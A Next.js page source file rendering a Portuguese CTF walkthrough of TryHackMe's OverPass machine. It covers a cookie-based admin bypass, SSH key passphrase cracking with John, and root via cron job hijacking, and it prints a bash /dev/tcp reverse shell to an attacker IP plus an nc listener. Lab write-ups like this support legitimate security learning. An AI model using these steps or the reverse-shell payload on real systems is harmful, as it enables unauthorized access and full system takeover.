import { Metadata } from "next"
import { ScrollAnimation } from "@/components/ScrollAnimation";
import { 
  CodeBlock, 
  InlineCode, 
  InfoBlock, 
  SummaryBlock, 
  SuccessBlock 
} from "../../components/ArticleComponents";

export const metadata: Metadata = {
  title: "Try Hack Me - OverPass | fe1ps",
  description: "Walkthrough detalhado da máquina OverPass do TryHackMe, explorando uma chave SSH com senha fraca e escalando privilégios via Crontab Hijacking.",
}

// --- Componente Principal do Artigo ---

export default function OverPassArticle() {
  return (
    <div className="py-12">
      <div className="container mx-auto px-4">
        <article> {/* Envolve o conteúdo do artigo */}
          <ScrollAnimation>
            <h1 className="text-4xl font-bold pt-4 mt-4 border-t border-white/30">Try Hack Me - OverPass</h1>
          </ScrollAnimation>
          
          <div className="space-y-12 mt-8">
              
            <ScrollAnimation delay={200}>
              <InfoBlock>
                <p><strong>Resumo da Máquina</strong></p>
                <p><strong>IP:</strong> <InlineCode>10.201.11.108</InlineCode></p>
                <p><strong>SO:</strong> Ubuntu Linux</p>
                <p><strong>Vetor de Ataque:</strong> Chave SSH privada exposta e protegida por senha fraca, escalação de privilégios via sequestro de tarefa Cron (Crontab Hijacking).</p>
              </InfoBlock>
            </ScrollAnimation>

            <ScrollAnimation delay={300}>
              <p className="text-gray-400">
                <strong>Tags:</strong> <InlineCode>#ctf</InlineCode> <InlineCode>#walkthrough</InlineCode> <InlineCode>#nmap</InlineCode> <InlineCode>#gobuster</InlineCode> <InlineCode>#ssh</InlineCode> <InlineCode>#john</InlineCode> <InlineCode>#privesc</InlineCode> <InlineCode>#cron</InlineCode>
              </p>
          </ScrollAnimation>

          <ScrollAnimation delay={200}>
            <section>
              <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">1. Reconhecimento e Enumeração</h2>
              <p className="mt-4 text-gray-300">
                A fase inicial de qualquer teste de invasão é o reconhecimento. O objetivo é mapear a superfície de ataque, identificando serviços, portas e tecnologias em execução no alvo.
              </p>
              <h3 className="text-xl font-semibold mt-4">1.1. Varredura com Nmap</h3>
              <p className="mt-2 text-gray-300">
                Utilizei o Nmap, uma ferramenta essencial para exploração de redes, para realizar uma varredura completa. Os parâmetros <InlineCode>-sV</InlineCode> e <InlineCode>-sC</InlineCode> são cruciais: o primeiro tenta determinar a versão dos serviços em execução, enquanto o segundo executa um conjunto de scripts padrão para detectar vulnerabilidades conhecidas e obter mais informações.
              </p>
              <CodeBlock>nmap -sV -sC 10.201.11.108</CodeBlock>
              <p className="mt-2 text-gray-300"><strong>Resultado:</strong></p>
              <CodeBlock>{`Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-06 11:27 -03
Nmap scan report for 10.201.11.108
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`}</CodeBlock>
              <SummaryBlock>
                  <p><strong>Pontos de Interesse Encontrados:</strong></p>
                  <ul className="list-disc list-inside mt-2">
                      <li><strong>Porta 22:</strong> Serviço SSH (<InlineCode>OpenSSH 7.6p1</InlineCode>). Um ponto de entrada potencial se credenciais forem encontradas.</li>
                      <li><strong>Porta 80:</strong> Servidor web HTTP (<InlineCode>Golang net/http server</InlineCode>). Aplicações web são uma superfície de ataque primária e devem ser investigadas a fundo.</li>
                  </ul>
              </SummaryBlock>

              <h3 className="text-xl font-semibold mt-4">1.2. Enumeração de Diretórios Web</h3>
              <p className="mt-2 text-gray-300">Com um servidor web ativo, o próximo passo lógico é procurar por diretórios e arquivos não listados publicamente. Ferramentas como o <strong>GoBuster</strong> automatizam esse processo de força bruta, testando uma lista de nomes comuns (wordlist) contra o servidor.</p>
              <CodeBlock>gobuster dir -u http://10.201.11.108/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt</CodeBlock>
              <p className="mt-2 text-gray-300"><strong>Resultado:</strong></p>
              <CodeBlock>{`/img              (Status: 301) [Size: 0] [--> img/]
/downloads        (Status: 301) [Size: 0] [--> downloads/]
/aboutus          (Status: 301) [Size: 0] [--> aboutus/]
/admin            (Status: 301) [Size: 42] [--> /admin/]
/css              (Status: 301) [Size: 0] [--> css/]`}</CodeBlock>
              <p className="mt-4 text-gray-300">O diretório <InlineCode>/admin/</InlineCode> se destaca imediatamente como o ponto mais interessante, sugerindo uma área administrativa que pode conter informações sensíveis ou funcionalidades restritas.</p>
            </section>
          </ScrollAnimation>

          <ScrollAnimation delay={200}>
            <section>
              <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">2. Acesso Inicial (SSH)</h2>
              <p className="mt-4 text-gray-300">
                Ao acessar o diretório <InlineCode>/admin/</InlineCode>, deparei-me com uma página de acesso negado. Analisando o código-fonte e os cookies da aplicação, notei a ausência de um token de sessão. Inserir um cookie manualmente, como <InlineCode>SessionToken</InlineCode> com um valor arbitrário, contornou a proteção. Essa falha de segurança revelou o conteúdo da página: uma chave SSH privada para o usuário <InlineCode>James</InlineCode>.
              </p>
              <CodeBlock>{`// Comando executado no console do navegador
Cookies.set("SessionToken","123");`}</CodeBlock>

              <h3 className="text-xl font-semibold mt-4">2.1. Quebrando a Senha da Chave SSH</h3>
              <p className="mt-2 text-gray-300">A chave SSH estava protegida por uma senha (passphrase), o que é uma boa prática. No entanto, a segurança de uma chave criptografada depende da força de sua senha. Usei a suíte <strong>John the Ripper</strong> para realizar um ataque de dicionário e descobrir a passphrase.</p>
              <ol className="list-decimal list-inside mt-2 text-gray-300 space-y-4">
                  <li><strong>Preparar a chave:</strong> Salvei a chave em um arquivo <InlineCode>id_rsa</InlineCode> e ajustei suas permissões para <InlineCode>600</InlineCode>, que é o padrão exigido pelo cliente SSH para chaves privadas.
                      <CodeBlock>chmod 600 id_rsa</CodeBlock>
                  </li>
                  <li><strong>Extrair o hash:</strong> O John não trabalha diretamente com a chave, mas com seu hash. O script <InlineCode>ssh2john.py</InlineCode> faz exatamente isso: converte a chave privada para um formato de hash que o John consegue entender.
                      <CodeBlock>{`python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash`}</CodeBlock>
                  </li>
                  <li><strong>Quebrar o hash:</strong> Com o hash em mãos, usei o John e a famosa wordlist <InlineCode>rockyou.txt</InlineCode> para testar milhões de senhas comuns em segundos.
                      <CodeBlock>john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt</CodeBlock>
                      <p className="mt-2 text-gray-300"><strong>Resultado:</strong></p>
                      <CodeBlock>{`Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
...
james13          (id_rsa)      
...
Session completed.`}</CodeBlock>
                  </li>
              </ol>
              <SuccessBlock>
                  A senha da chave SSH foi descoberta: <InlineCode>james13</InlineCode>. Uma senha fraca e previsível.
              </SuccessBlock>

              <h3 className="text-xl font-semibold mt-4">2.2. Obtendo Acesso</h3>
              <p className="mt-2 text-gray-300">Com a chave privada (<InlineCode>id_rsa</InlineCode>) e a senha recém-descoberta (<InlineCode>james13</InlineCode>), o acesso via SSH tornou-se trivial. O parâmetro <InlineCode>-i</InlineCode> especifica o arquivo de identidade (a chave privada) a ser usado na autenticação.</p>
              <CodeBlock>ssh -i id_rsa james@10.201.11.108</CodeBlock>

              <h3 className="text-xl font-semibold mt-4">2.3. Capturando a Flag do Usuário</h3>
              <p className="mt-2 text-gray-300">Após o login, a primeira tarefa é localizar a flag do usuário, que geralmente se encontra no diretório home do usuário atual.</p>
              <CodeBlock>{`james@overpass-prod:~$ ls
todo.txt  user.txt
james@overpass-prod:~$ cat user.txt`}</CodeBlock>
              <SuccessBlock>
                  <strong>user.txt:</strong> <InlineCode>thm{"{"...user_flag..."}"}</InlineCode>
              </SuccessBlock>
            </section>
          </ScrollAnimation>

          <ScrollAnimation delay={200}>
            <section>
              <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">3. Escalação de Privilégios</h2>
              <p className="mt-4 text-gray-300">
                O acesso como usuário comum é apenas o primeiro passo. O objetivo final é obter controle total do sistema, ou seja, tornar-se o usuário <InlineCode>root</InlineCode>. Para isso, é preciso encontrar um vetor de escalação de privilégios.
              </p>
              <h3 className="text-xl font-semibold mt-4">3.1. Identificando o Vetor (Cron Job)</h3>
              <p className="mt-2 text-gray-300">Uma das primeiras verificações em um sistema Linux é a lista de tarefas agendadas (cron jobs), especialmente aquelas que rodam com privilégios elevados. O arquivo <InlineCode>/etc/crontab</InlineCode> revelou uma tarefa extremamente perigosa:</p>
              <CodeBlock>{`james@overpass-prod:~$ cat /etc/crontab
...
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash`}</CodeBlock>
              <p className="mt-4 text-gray-300">Esta linha significa que, a cada minuto, o sistema, como usuário <strong>root</strong>, baixa um script do domínio <InlineCode>overpass.thm</InlineCode> e o executa diretamente com <InlineCode>bash</InlineCode>, sem qualquer validação. Se pudermos controlar o que é baixado, podemos executar qualquer comando como root. A técnica para explorar isso é o <strong>Crontab Hijacking</strong> através de envenenamento de DNS local.</p>

              <h3 className="text-xl font-semibold mt-4">3.2. Exploração (Crontab Hijacking)</h3>
              <p className="mt-2 text-gray-300">O plano de ataque consiste em três etapas: redirecionar o domínio, hospedar um payload malicioso e aguardar a conexão.</p>
              <ol className="list-decimal list-inside mt-2 text-gray-300 space-y-4">
                  <li><strong>Modificar <InlineCode>/etc/hosts</InlineCode>:</strong> A primeira coisa que um sistema Linux faz ao tentar resolver um nome de domínio é consultar o arquivo <InlineCode>/etc/hosts</InlineCode>. Se adicionarmos uma entrada para <InlineCode>overpass.thm</InlineCode> apontando para nossa máquina, a requisição do <InlineCode>curl</InlineCode> virá para nós em vez do servidor legítimo.
                      <CodeBlock>{`# Na máquina alvo (james@overpass-prod)
echo "YOUR_ATTACKER_IP overpass.thm" >> /etc/hosts`}</CodeBlock>
                  </li>
                  <li>
                      <strong>Hospedar o Payload:</strong> Na nossa máquina de atacante, servimos um script malicioso que será baixado pelo servidor.
                      <CodeBlock>{`# Na máquina do atacante (ex: com python)
echo 'bash -c "bash -i >& /dev/tcp/YOUR_ATTACKER_IP/4444 0>&1"' > buildscript.sh
python3 -m http.server 80`}</CodeBlock>
                  </li>
                  <li>
                      <strong>Receber a Conexão:</strong> Mantemos um listener na nossa máquina para receber a reverse shell.
                      <CodeBlock>{`# Na máquina do atacante
nc -lvnp 4444`}</CodeBlock>
                      <p className="mt-2 text-gray-300">Após um minuto, o cron job é executado, nosso payload é baixado e executado, e recebemos uma shell como root.</p>
                  </li>
              </ol>
              <h3 className="text-xl font-semibold mt-4">3.3. Capturando a Flag de Root</h3>
              <p className="mt-2 text-gray-300">Com acesso root, o passo final é ler a flag.</p>
              <CodeBlock>{`# whoami
root
# cat /root/root.txt`}</CodeBlock>
              <SuccessBlock>
                  <strong>root.txt:</strong> <InlineCode>thm{...root_flag...}</InlineCode>
              </SuccessBlock>
            </section>
          </ScrollAnimation>

          <ScrollAnimation delay={200}>
            <section>
                <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">4. Conclusão</h2>
                <p className="mt-4 text-gray-300">
                    A máquina Overpass demonstra a importância da defesa em profundidade. Uma série de vulnerabilidades aparentemente pequenas, quando encadeadas, levaram ao comprometimento total do sistema.
                </p>
            </section>
          </ScrollAnimation>

          </div>
        </article>
      </div>
    </div>
  );
}